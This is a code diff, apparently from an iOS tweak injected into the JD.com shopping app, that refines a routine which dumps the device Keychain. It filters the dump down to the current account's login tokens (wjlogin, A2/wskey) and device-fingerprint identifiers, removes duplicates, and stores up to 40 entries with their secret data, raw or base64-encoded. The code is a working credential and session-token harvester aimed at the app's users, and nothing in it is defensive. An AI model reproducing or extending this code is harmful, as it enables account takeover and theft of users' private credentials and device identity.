@@ -183,10 +183,14 @@ static NSString *cookieStringFromNative(void) {
 
 #pragma mark - A2/wskey 深挖: Keychain 全量 + URLSession 请求头
 
+// 只收当前登录号相关 + 设备指纹, 历史账号/无关大块头(AppSign/ullink/微信SDK)全部不要
 static BOOL jdKeychainKeyInteresting(NSString *svc, NSString *acct, NSString *dataStr) {
-    NSString *hay = [NSString stringWithFormat:@"%@|@|%@|@|%@", svc ?: @"", acct ?: @"", dataStr ?: @""].lowercaseString;
-    NSArray *keys = @[@"a2", @"wskey", @"wjlogin", @"jingdong", @"jd.com", @"360buy", @"jdmobile", @"pt_key", @"pt_pin", @"thor", @"pin="];
-    for (NSString *k in keys) if ([hay containsString:k]) return YES;
+    NSString *s = svc.lowercaseString, *a = acct.lowercaseString, *d = dataStr.lowercaseString;
+    if ([s containsString:@"wjlogininfos"]) return [d containsString:@"\"active\":1"]; // 只要当前登录号
+    if ([s containsString:@"wjlogin"]) return YES;                                      // 当前登录手机号/GUID
+    if ([s containsString:@"360buy.jdmobile"]) {
+        if ([a containsString:@"uuidfordevice"] || [a containsString:@"device_id"]) return YES; // 设备指纹
+    }
     return NO;
 }
 
@@ -213,6 +217,10 @@ static void dumpKeychain(void) {
             if (d.length == 0 || d.length > 262144) continue;
             NSString *raw = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] ?: @"";
             if (!jdKeychainKeyInteresting(svc, acct, raw)) continue;
+            // 去重: 同 svc+acct 只收一条 (两个 keychain class 会给出重复项)
+            BOOL dup = NO;
+            for (NSDictionary *h in g_kcHits) if ([h[@"svc"] isEqualToString:svc] && [h[@"acct"] isEqualToString:acct]) { dup = YES; break; }
+            if (dup) continue;
             if (g_kcHits.count >= 40) return;
             NSString *b64 = raw.length > 0 ? raw : [d base64EncodedStringWithOptions:0];
             [g_kcHits addObject:@{@"svc": svc, @"acct": acct, @"len": @(d.length), @"data": [b64 substringToIndex:MIN((NSUInteger)8000, b64.length)]}];
